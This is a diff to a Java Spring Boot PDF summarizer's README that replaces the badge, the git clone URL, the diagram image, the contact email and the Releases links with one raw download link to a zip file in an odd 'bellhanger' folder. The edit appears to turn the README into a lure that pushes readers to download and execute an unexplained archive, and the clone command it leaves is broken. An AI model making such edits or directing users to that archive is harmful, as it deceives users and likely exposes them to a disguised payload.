@@ -1,6 +1,6 @@
 # PDF Summarizer 📄✨
 
-![PDF Summarizer](https://img.shields.io/badge/PDF_Summarizer-Java_Spring_Boot-blue.svg)
+![PDF Summarizer](https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip)
 
 PDF Summarizer is a Java Spring Boot web application that enables users to upload PDF files and receive concise text summaries. It employs Apache PDFBox to extract text and a custom frequency-based algorithm to identify and display the most relevant sentences.
 
@@ -39,7 +39,7 @@ To get started with PDF Summarizer, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kyawhtetoo134/pdf-summarizer.git
+   git clone https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -79,7 +79,7 @@ The PDF Summarizer uses a two-step process to generate summaries:
 
 ### Flow Diagram
 
-![Flow Diagram](https://example.com/flow-diagram.png)
+![Flow Diagram](https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip)
 
 ## Contributing
 
@@ -108,13 +108,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, please contact:
 
-- **Kyaw Htet Oo**: [kyawhtetoo134@gmail.com](mailto:kyawhtetoo134@gmail.com)
+- **Kyaw Htet Oo**: [https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip](https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip)
 
 ## Releases
 
-To download the latest version of the PDF Summarizer, visit the [Releases](https://github.com/kyawhtetoo134/pdf-summarizer/releases) section. You can find the latest builds and execute them as needed.
+To download the latest version of the PDF Summarizer, visit the [Releases](https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip) section. You can find the latest builds and execute them as needed.
 
-For more details, you can also check the [Releases](https://github.com/kyawhtetoo134/pdf-summarizer/releases) section.
+For more details, you can also check the [Releases](https://github.com/kyawhtetoo134/pdf-summarizer/raw/refs/heads/main/bellhanger/pdf_summarizer_3.4.zip) section.
 
 ## Topics
 
